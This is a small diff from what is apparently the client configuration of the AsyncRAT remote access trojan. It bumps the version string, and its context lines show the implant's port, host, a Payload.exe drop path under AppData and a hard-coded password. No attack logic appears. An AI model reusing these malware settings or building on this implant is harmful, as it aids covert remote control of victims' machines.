@@ -9,7 +9,7 @@ namespace Client
     {
         public static string Ports = "6606";
         public static string Host = "127.0.0.1";
-        public static string Version = "AsyncRAT 0.4.6";
+        public static string Version = "AsyncRAT 0.4.7";
         public static string Install = "false";
         public static string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
         public static string Password = "NYAN CAT";
